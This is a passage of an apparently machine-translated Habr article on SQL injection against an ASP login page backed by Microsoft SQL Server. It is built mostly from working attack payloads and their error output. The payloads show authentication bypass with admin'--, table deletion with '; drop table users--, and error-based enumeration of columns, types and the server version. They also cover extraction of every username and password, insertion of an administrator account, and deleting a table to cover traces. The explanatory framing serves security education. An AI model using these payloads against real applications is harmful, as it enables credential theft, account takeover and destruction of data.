class="hljs-number">20</span></span>; cn.<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>( "localserver", "sa", "password" ); username = <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> String( Request.form("username") ); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>( username.length &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">Login</span></span>( cn ); } } cn.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>(); Main(); %&gt;</code> </pre> <br>  The vulnerability here is contained in "process_login.asp", which creates a query of the following type: <br><pre> <code class="hljs sql">var sql = "<span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'" + username + "'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'" + password + "'</span></span><span class="hljs-string"><span class="hljs-string">";</span></span></code> </pre> <br>  If the user enters: <br><pre> <code class="hljs sql">Username: '; <span class="hljs-keyword"><span class="hljs-keyword">drop</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span><span class="hljs-comment"><span class="hljs-comment">-- Password:</span></span></code> </pre><br>  the ‚Äúusers‚Äù table will be deleted, which will block access to the application for all users.  The combination ‚Äú-‚Äù in Transact-SQL defines a single-line comment, and ‚Äú;‚Äù indicates the end of one line and the beginning of another.  Two consecutive dashes in this query are used to complete the query without errors. <br><br>  Moreover, an attacker can log in with any user name using the following structure: <br><pre> <code class="hljs pgsql">Username: <span class="hljs-keyword"><span class="hljs-keyword">admin</span></span><span class="hljs-string"><span class="hljs-string">'--</span></span></code> </pre> <br>  And by entering the following information, the attacker will be able to log in as a fictional user: <br><pre> <code class="hljs python">Username: <span class="hljs-string"><span class="hljs-string">' union select 1, '</span></span>fictional_use<span class="hljs-string"><span class="hljs-string">r', '</span></span>some_password<span class="hljs-string"><span class="hljs-string">', 1--</span></span></code> </pre> <br>  The reason for the performance of this method is that the application ‚Äúbelieves‚Äù that the returned dummy result is a set of records from the database. <br><br><h4>  Receiving information based on error messages </h4><br>  The inventor of this technique is David Litchfield, a researcher in the field of penetration testing (to test the protection system).  Later, David wrote a paper on this topic [1], which was referred to by many other authors.  His work explains the mechanism of using error messages - the error message technique.  In his work, he fully explains this method to readers, and gives further impetus to the development of his own understanding of this problem. <br><br>  For successful data management, an attacker must know the structure of the databases and tables to which he wants to gain access.  For example, our ‚Äúusers‚Äù table was created using the following command: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">create</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span>( <span class="hljs-keyword"><span class="hljs-keyword">id</span></span> <span class="hljs-built_in"><span class="hljs-built_in">int</span></span>, username <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-number"><span class="hljs-number">255</span></span>), <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-number"><span class="hljs-number">255</span></span>), privs <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> )</code> </pre><br>  And contains the following users: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">values</span></span>( <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'admin'</span></span>, <span class="hljs-string"><span class="hljs-string">'r00tr0x!'</span></span>, <span class="hljs-number"><span class="hljs-number">0xffff</span></span> ) <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">values</span></span>( <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'guest'</span></span>, <span class="hljs-string"><span class="hljs-string">'guest'</span></span>, <span class="hljs-number"><span class="hljs-number">0x0000</span></span> ) <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">values</span></span>( <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'chris'</span></span>, <span class="hljs-string"><span class="hljs-string">'password'</span></span>, <span class="hljs-number"><span class="hljs-number">0x00ff</span></span> ) <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">values</span></span>( <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'fred'</span></span>, <span class="hljs-string"><span class="hljs-string">'sesame'</span></span>, <span class="hljs-number"><span class="hljs-number">0x00ff</span></span> )</code> </pre><br>  Suppose our hacker wants to insert his own entry into the table.  It is unlikely that he will succeed if he does not know its structure.  But even if he succeeds in this, the value of the ‚Äúprivs‚Äù field will remain incomprehensible.  A cracker can insert the value ‚Äú1‚Äù by creating an account with low privileges, while he needs access at the level of the application administrator. <br><br>  Fortunately, for the hacker, the standard behavior of ASP for errors is the display of messages about them, with their help completely defining the database structure, and therefore finding out the values ‚Äã‚Äãof all fields from user accounts that are entered into the application database. <br><br>  (In the following example, we will use the above database as well as the asp script to show this technique in action.) <br><br>  First, the attacker will want to set the names of the tables with which the queries work, as well as the names of the fields.  To achieve this goal, the attacker will use the "having" construction in select expressions: <br><pre> <code class="hljs sql">Username: ' having 1=1<span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  Which will cause the following error: <br><pre> <code class="hljs pgsql">Microsoft OLE DB Provider <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ODBC Drivers error <span class="hljs-string"><span class="hljs-string">'80040e14'</span></span> [Microsoft][ODBC <span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span> Driver][<span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>]<span class="hljs-keyword"><span class="hljs-keyword">Column</span></span> <span class="hljs-string"><span class="hljs-string">'users.id'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> invalid <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> list because it <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> contained <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> an <span class="hljs-keyword"><span class="hljs-keyword">aggregate</span></span> <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> there <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">no</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GROUP</span></span> <span class="hljs-keyword"><span class="hljs-keyword">BY</span></span> clause. /process_login.asp, <span class="hljs-type"><span class="hljs-type">line</span></span> <span class="hljs-number"><span class="hljs-number">35</span></span></code> </pre><br><br>  Thus, knowing the table names and the name of the first column in it.  This procedure can be continued using the ‚Äúgroup by‚Äù operator, as shown below: <br><pre> <code class="hljs vhdl">Username: ' <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> by users.id having <span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  (which in turn will generate a new error) <br><pre> <code class="hljs pgsql">Microsoft OLE DB Provider <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ODBC Drivers error <span class="hljs-string"><span class="hljs-string">'80040e14'</span></span> [Microsoft][ODBC <span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span> Driver][<span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>]<span class="hljs-keyword"><span class="hljs-keyword">Column</span></span> <span class="hljs-string"><span class="hljs-string">'users.username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> invalid <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> list because it <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> contained <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> either an <span class="hljs-keyword"><span class="hljs-keyword">aggregate</span></span> <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">GROUP</span></span> <span class="hljs-keyword"><span class="hljs-keyword">BY</span></span> clause. /process_login.asp, <span class="hljs-type"><span class="hljs-type">line</span></span> <span class="hljs-number"><span class="hljs-number">35</span></span></code> </pre> <br>  As a result, the hacker will come the following design: <br><pre> <code class="hljs vhdl">' <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> by users.id, users.username, users.password, users.privs having <span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  Which will not cause errors and will be equivalent to: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">''</span></span></code> </pre> <br>  Thus, the attacker learns that the query affects only the ‚Äúusers‚Äù table, whose structure is 'id, username, password, privs' (in that order). <br><br>  Use this information if you can find out the type of data that is used in each of the columns.  Information about the type of data can be obtained using "type conversion", for example: <br><pre> <code class="hljs sql">Username: ' union <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">sum</span></span>(username) <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  The meaning of the summ () function is that the SQL server tries to execute it before it determines whether the value is numeric or symbolic.  Attempting to calculate the "amount" of a text field will result in the following error: <br><pre> <code class="hljs pgsql">Microsoft OLE DB Provider <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ODBC Drivers error <span class="hljs-string"><span class="hljs-string">'80040e07'</span></span> [Microsoft][ODBC <span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span> Driver][<span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>]The sum <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> average <span class="hljs-keyword"><span class="hljs-keyword">aggregate</span></span> operation cannot take a <span class="hljs-type"><span class="hljs-type">varchar</span></span> data <span class="hljs-keyword"><span class="hljs-keyword">type</span></span> <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> an argument. /process_login.asp, <span class="hljs-type"><span class="hljs-type">line</span></span> <span class="hljs-number"><span class="hljs-number">35</span></span></code> </pre> <br>  Which tells us that the data type in the ‚Äúusername‚Äù field is varchar.  On the other hand, if we try to calculate the sum () of a numerical type, we will receive a message notifying that the number of characters in the set of two text strings does not match: <br><pre> <code class="hljs markdown">Username: ' union select sum(id) from users-- Microsoft OLE DB Provider for ODBC Drivers error '80040e14' [<span class="hljs-string"><span class="hljs-string">Microsoft</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">ODBC SQL Server Driver</span></span>][<span class="hljs-string"><span class="hljs-string">SQL Server</span></span>]All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists. /process_login.asp, line 35</code> </pre> <br>  We can use a similar technique to determine the data type of almost any column, any table, located in the database. <br><br>  Which in turn will help the attacker to form a well-composed ‚Äúinsert‚Äù request, for example: <br><pre> <code class="hljs python">Username: <span class="hljs-string"><span class="hljs-string">'; insert into users values( 666, '</span></span>attacke<span class="hljs-string"><span class="hljs-string">r', '</span></span>fooba<span class="hljs-string"><span class="hljs-string">r', 0xffff )--</span></span></code> </pre> <br>  However, for the possibility of the algorithm does not end there.  A hacker can get useful information from errors about the environment or the database itself.  The list of standard errors can be obtained using the design: <br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> master..sysmessages</code> </pre> <br>  After completing this request, you can get a lot of interesting information. <br><br>  The type conversion information is particularly useful.  If you try to convert a string to an integer, a message will be returned containing all the content of the string.  In our example, the ‚Äúusername‚Äù conversion will return the SQL server version as well as the operating system version. <br><pre> <code class="hljs markdown">Username: ' union select @@version,1,1,1-- Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [<span class="hljs-string"><span class="hljs-string">Microsoft</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">ODBC SQL Server Driver</span></span>][<span class="hljs-string"><span class="hljs-string">SQL Server</span></span>]Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 2) ' to a column of data type int. /process_login.asp, line 35</code> </pre> <br>  In the example above, we will try to convert the embedded constant <pre> <code class="hljs cs"><span class="hljs-string"><span class="hljs-string">'@@version'</span></span></code> </pre>  integer value, since the first column in the ‚Äúusers‚Äù table has this data type. <br><br>  The method can be used to read any value in any table in the database.  Thus, if an attacker wants to know user names and passwords, then most likely he will use the following construction to read the data: <br><pre> <code class="hljs sql">Username: ' union <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">min</span></span>(username),<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username &gt; <span class="hljs-string"><span class="hljs-string">'a'</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  If you select a user whose ‚Äúusername‚Äù is greater than a, it will lead to an attempt to convert types to an integer value: <br><pre> <code class="hljs pgsql">Microsoft OLE DB Provider <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ODBC Drivers error <span class="hljs-string"><span class="hljs-string">'80040e07'</span></span> [Microsoft][ODBC <span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span> Driver][<span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>]Syntax error converting the <span class="hljs-type"><span class="hljs-type">varchar</span></span> <span class="hljs-keyword"><span class="hljs-keyword">value</span></span> <span class="hljs-string"><span class="hljs-string">'admin'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> a <span class="hljs-keyword"><span class="hljs-keyword">column</span></span> <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> data <span class="hljs-keyword"><span class="hljs-keyword">type</span></span> <span class="hljs-type"><span class="hljs-type">int</span></span>. /process_login.asp, <span class="hljs-type"><span class="hljs-type">line</span></span> <span class="hljs-number"><span class="hljs-number">35</span></span></code> </pre> <br>  Thus, we will get a list of users, after which we will be able to proceed to obtaining passwords: <br><pre> <code class="hljs markdown">Username: ' union select password,1,1,1 from users where username = 'admin'-- Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [<span class="hljs-string"><span class="hljs-string">Microsoft</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">ODBC SQL Server Driver</span></span>][<span class="hljs-string"><span class="hljs-string">SQL Server</span></span>]Syntax error converting the varchar value 'r00tr0x!' to a column of data type int. /process_login.asp, line 35</code> </pre> <br>  A more elegant way is to isolate all user names and passwords in one sample, and then try to convert them to an integer value.  It should be noted that Transact-SQL expressions can be assembled together in one line without changing their value - consider the following example: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">begin</span></span> <span class="hljs-keyword"><span class="hljs-keyword">declare</span></span> @ret <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-number"><span class="hljs-number">8000</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> @ret=<span class="hljs-string"><span class="hljs-string">':'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> @ret=@ret+<span class="hljs-string"><span class="hljs-string">' '</span></span>+username+<span class="hljs-string"><span class="hljs-string">'/'</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username&gt;@ret <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> @ret <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ret <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> foo <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> <br>  Obviously, the attacker will ‚Äúlog in‚Äù with this username: <br><pre> <code class="hljs sql">Username: '; <span class="hljs-keyword"><span class="hljs-keyword">begin</span></span> <span class="hljs-keyword"><span class="hljs-keyword">declare</span></span> @ret <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-number"><span class="hljs-number">8000</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> @ret=<span class="hljs-string"><span class="hljs-string">':'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> @ret=@ret+<span class="hljs-string"><span class="hljs-string">' '</span></span>+username+<span class="hljs-string"><span class="hljs-string">'/'</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username&gt;@ret <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> @ret <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ret <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> foo <span class="hljs-keyword"><span class="hljs-keyword">end</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  This query will create a table foo, which will contain a single column ‚Äúret‚Äù, which will contain all of our rows.  Often, even a user with low privileges has the ability to create a table in a database, or even a temporary database. <br><br>  A cracker can thus select all rows from this table, as well as in the previous example: <br><pre> <code class="hljs markdown">Username: ' union select ret,1,1,1 from foo-- Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [<span class="hljs-string"><span class="hljs-string">Microsoft</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">ODBC SQL Server Driver</span></span>][<span class="hljs-string"><span class="hljs-string">SQL Server</span></span>]Syntax error converting the varchar value ': admin/r00tr0x! guest/guest chris/password fred/sesame' to a column of data type int. /process_login.asp, line 35</code> </pre> <br>  And after you notice the traces, deleting the table: <br><pre> <code class="hljs sql">Username: '; <span class="hljs-keyword"><span class="hljs-keyword">drop</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> foo<span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  The above examples show us all the flexibility offered by this algorithm.  Needless to say, if an attacker manages to cause an error while accessing the database, their work is simplified many times. </div><p>Source: <a href="https://habr.com/ru/post/157531/">https://habr.com/ru/post/157531/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../157521/index.html">Creating a system of sales "within the system" - remote connection stores and payment of funds</a></li>
<li><a href="../157523/index.html">IT Compote # 28 Programming and Technology Podcast</a></li>
<li><a href="../157525/index.html">Living Computer Museum - a computer museum where you can touch everything, by Paul Allen</a></li>
<li><a href="../157527/index.html">OLinuXino A13: a miniature open-source computer for $ 60</a></li>
<li><a href="../157529/index.html">UFMS in Kemerovo broadcasts video from reception to its website</a></li>
<li><a href="../157533/index.html">PLC error search sequence</a></li>
<li><a href="../157537/index.html">Python performance. Easy way</a></li>
<li><a href="../157539/index.html">Dnevnik.ru now on Habrahabr</a></li>
<li><a href="../157541/index.html">Features of "national" routing</a></li>
<li><a href="../157545/index.html">Rake, or 5 typical Asterisk configuration errors</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>